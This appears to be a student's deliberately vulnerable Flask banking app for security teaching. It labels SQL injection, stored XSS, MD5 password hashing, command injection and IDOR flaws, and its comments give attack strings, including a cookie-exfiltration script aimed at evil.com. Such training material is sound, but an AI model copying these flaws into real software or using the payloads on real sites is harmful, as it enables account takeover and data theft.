""" 
Group Members :
Maryam Khan CR-22021
Ayesha Yousuf CR-22004

        VULNERABLE VERSION 

INTENTIONAL VULNERABILITIES (educational purposes ONLY):
  1. SQL Injection      — /login
  2. XSS               — /comments
  3. Broken Auth       — /register  (MD5, no salt, no rate-limit)
  4. Command Injection — /ping
  5. IDOR              — /user/<id>
"""

from flask import Flask, request, jsonify, render_template_string, session
import sqlite3, hashlib, os, subprocess

app = Flask(__name__)
app.secret_key = "secret123"          # VULN 3: weak hardcoded secret
DB_PATH = "vuln.db"

# ─── Database Setup ───────────────────────────────────────────────────────────
def init_db():
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("""CREATE TABLE IF NOT EXISTS users (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        username TEXT UNIQUE, password TEXT,
        role TEXT DEFAULT 'user', email TEXT, balance REAL DEFAULT 1000.0)""")
    c.execute("""CREATE TABLE IF NOT EXISTS comments (
        id INTEGER PRIMARY KEY AUTOINCREMENT, author TEXT, content TEXT)""")
    for username, pwd, role, email, bal in [
        ("admin", "admin123", "admin", "admin@vulnbank.com", 99999.0),
        ("alice", "password", "user",  "alice@vulnbank.com", 5000.0),
        ("bob",   "bob123",   "user",  "bob@vulnbank.com",   2500.0),
    ]:
        try:
            c.execute("INSERT INTO users (username,password,role,email,balance) VALUES (?,?,?,?,?)",
                      (username, hashlib.md5(pwd.encode()).hexdigest(), role, email, bal))
        except sqlite3.IntegrityError:
            pass
    conn.commit()
    conn.close()

# ─── Templates ────────────────────────────────────────────────────────────────
NAV = '<nav style="margin:10px 0"><a href="/">Home</a> | <a href="/comments">Comments</a> | <a href="/ping">Ping</a> | <a href="/user/1">Profile</a></nav>'
STYLE = '<style>body{font-family:Arial;max-width:860px;margin:30px auto;padding:20px;background:#fff5f5}.card{background:#fff;padding:20px;border-radius:8px;margin:15px 0;box-shadow:0 2px 6px rgba(0,0,0,.1)}input{padding:8px;margin:4px;border:1px solid #ddd;border-radius:4px}button{padding:9px 18px;background:#c0392b;color:#fff;border:none;border-radius:4px;cursor:pointer}.vb{background:#c0392b;color:#fff;font-size:11px;padding:2px 8px;border-radius:10px}pre{background:#111;color:#0f0;padding:12px;border-radius:4px}code{background:#fde;padding:2px 4px;border-radius:3px}h1{color:#c0392b}a{color:#c0392b}</style>'

HOME_HTML = f"""<!DOCTYPE html><html><head><title>VulnBank</title>{STYLE}</head><body>
<h1>&#128680; VulnBank <span class="vb">VULNERABLE VERSION</span></h1>{NAV}<hr>
<div class="card">
  <h2>Login <span class="vb">VULN #1: SQL Injection</span></h2>
  <p>Attack: username = <code>' OR '1'='1'--</code>, any password</p>
  <form method="POST" action="/login">
    <input name="username" placeholder="Username"><br>
    <input name="password" type="password" placeholder="Password"><br><br>
    <button>Login</button>
  </form>
</div>
<div class="card">
  <h2>Register <span class="vb">VULN #3: Broken Auth (MD5)</span></h2>
  <p>Passwords stored as unsalted MD5 — crackable with rainbow tables</p>
  <form method="POST" action="/register">
    <input name="username" placeholder="Username"><br>
    <input name="password" type="password" placeholder="Any password (even 1 char)"><br><br>
    <button>Register</button>
  </form>
</div>
<p>Session: <b>{{{{ session.get('user','not logged in') }}}}</b></p>
</body></html>"""

COMMENTS_HTML = f"""<!DOCTYPE html><html><head><title>Comments</title>{STYLE}</head><body>
<h1>&#128680; VulnBank</h1>{NAV}<hr>
<div class="card">
  <h2>Comments <span class="vb">VULN #2: Stored XSS</span></h2>
  <p>Attack: post <code>&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code></p>
  <form method="POST">
    <input name="author" placeholder="Name">
    <input name="content" placeholder="Comment..." style="width:320px">
    <button>Post</button>
  </form>
</div>
{{% for c in comments %}}
<div class="card" style="border-left:4px solid #e74c3c">
  <b>{{{{ c[1] }}}}</b>: {{{{ c[2]|safe }}}}
</div>
{{% endfor %}}
</body></html>"""

PING_HTML = f"""<!DOCTYPE html><html><head><title>Ping</title>{STYLE}</head><body>
<h1>&#128680; VulnBank</h1>{NAV}<hr>
<div class="card">
  <h2>Network Ping <span class="vb">VULN #4: Command Injection</span></h2>
  <p>Attack: <code>127.0.0.1; echo INJECTED</code> or <code>127.0.0.1 &amp;&amp; echo INJECTED</code></p>
  <form method="POST">
    <input name="host" placeholder="e.g. 127.0.0.1" style="width:300px">
    <button>Ping</button>
  </form>
</div>
{{% if output %}}<pre>{{{{ output }}}}</pre>{{% endif %}}
</body></html>"""

USER_HTML = f"""<!DOCTYPE html><html><head><title>Profile</title>{STYLE}</head><body>
<h1>&#128680; VulnBank</h1>{NAV}<hr>
<div class="card">
  <h2>User Profile <span class="vb">VULN #5: IDOR</span></h2>
  <p>Attack: change URL to <code>/user/1</code>, <code>/user/2</code>, <code>/user/3</code> — no auth check!</p>
  <table>
    <tr><td><b>ID</b></td><td>{{{{ u[0] }}}}</td></tr>
    <tr><td><b>Username</b></td><td>{{{{ u[1] }}}}</td></tr>
    <tr><td><b>Email</b></td><td>{{{{ u[3] }}}}</td></tr>
    <tr><td><b>Balance</b></td><td>${{{{ u[5] }}}}</td></tr>
    <tr><td><b>Role</b></td><td>{{{{ u[4] }}}}</td></tr>
  </table>
</div>
</body></html>"""

# ─── Routes ───────────────────────────────────────────────────────────────────

@app.route("/")
def home():
    return render_template_string(HOME_HTML, session=session)


# ════ VULNERABILITY 1: SQL INJECTION ════════════════════════════════════════
# Root Cause: f-string interpolation puts user input directly into SQL string.
# Attack:     username = ' OR '1'='1'--
# Effect:     The WHERE clause always evaluates true → first row (admin) returned.
@app.route("/login", methods=["POST"])
def login():
    u  = request.form["username"]
    p  = request.form["password"]
    ph = hashlib.md5(p.encode()).hexdigest()

    # ⚠️  VULNERABLE: raw string formatting — attacker controls SQL logic
    query = f"SELECT * FROM users WHERE username='{u}' AND password='{ph}'"

    conn = sqlite3.connect(DB_PATH)
    row  = conn.execute(query).fetchone()     # <─── VULNERABLE LINE
    conn.close()

    if row:
        session["user"] = row[1]; session["uid"] = row[0]
        return jsonify({"status": "success", "user": row[1], "role": row[3]})
    return jsonify({"status": "error", "message": "Invalid credentials"}), 401


# ════ VULNERABILITY 2: CROSS-SITE SCRIPTING (XSS) ══════════════════════════
# Root Cause: |safe in Jinja2 template disables auto-escaping.
# Attack:     Post <script>fetch('https://evil.com?c='+document.cookie)</script>
# Effect:     Malicious script executes in every visitor's browser.
@app.route("/comments", methods=["GET", "POST"])
def comments():
    conn = sqlite3.connect(DB_PATH)
    if request.method == "POST":
        # ⚠️  VULNERABLE: content stored unsanitized
        conn.execute("INSERT INTO comments (author,content) VALUES (?,?)",
                     (request.form.get("author", "Anon"),
                      request.form.get("content", "")))
        conn.commit()
    rows = conn.execute("SELECT * FROM comments").fetchall()
    conn.close()
    # ⚠️  VULNERABLE: template uses {{ c[2]|safe }} — raw HTML rendered
    return render_template_string(COMMENTS_HTML, comments=rows)


# ════ VULNERABILITY 3: BROKEN AUTHENTICATION ════════════════════════════════
# Root Cause: MD5 with no salt; no minimum password length; no rate limiting.
# Attack:     Dump DB → MD5('password') = 5f4dcc3b5aa765d61d8327deb882cf99
#             → paste into crackstation.net → instant crack.
#             Also: brute-force 1000s of logins per second (no lockout).
@app.route("/register", methods=["POST"])
def register():
    u  = request.form["username"]
    p  = request.form["password"]
    # ⚠️  VULNERABLE: MD5, no salt, no minimum length
    ph = hashlib.md5(p.encode()).hexdigest()

    conn = sqlite3.connect(DB_PATH)
    try:
        conn.execute("INSERT INTO users (username,password) VALUES (?,?)", (u, ph))
        conn.commit()
        return jsonify({"status": "registered"})
    except sqlite3.IntegrityError:
        return jsonify({"status": "error", "message": "Username taken"}), 400
    finally:
        conn.close()


# ════ VULNERABILITY 4: COMMAND INJECTION ════════════════════════════════════
# Root Cause: shell=True with unsanitized user input in subprocess call.
# Attack:     host = "safe; echo INJECTED"  or  "safe && echo INJECTED"
# Effect:     Arbitrary OS commands execute on the server.
# Uses "echo" as base command so it works cross-platform (Linux & Windows).
@app.route("/ping", methods=["GET", "POST"])
def ping():
    output = ""
    if request.method == "POST":
        host = request.form.get("host", "")
        # VULNERABLE: user input directly in shell string — attacker appends commands
        result = subprocess.run(
            f"echo Checking: {host}",
            shell=True, capture_output=True, text=True, timeout=10
        )
        output = result.stdout + result.stderr
    return render_template_string(PING_HTML, output=output)


# ════ VULNERABILITY 5: IDOR (Insecure Direct Object Reference) ══════════════
# Root Cause: No ownership/authorization check before returning user data.
# Attack:     Visit /user/1, /user/2, /user/3 — see any user's data without auth.
# Effect:     Any anonymous visitor can dump all user emails and balances.
@app.route("/user/<int:uid>")
def user_profile(uid):
    conn = sqlite3.connect(DB_PATH)
    # ⚠️  VULNERABLE: uid comes from URL — no check that it matches session user
    row = conn.execute(
        "SELECT id,username,password,email,role,balance FROM users WHERE id=?", (uid,)
    ).fetchone()
    conn.close()
    if not row:
        return jsonify({"error": "User not found"}), 404
    return render_template_string(USER_HTML, u=row)


@app.route("/reset")
def reset():
    if os.path.exists(DB_PATH): os.remove(DB_PATH)
    init_db()
    return jsonify({"status": "db reset"})


if __name__ == "__main__":
    init_db()
    app.run(debug=True, port=5000)
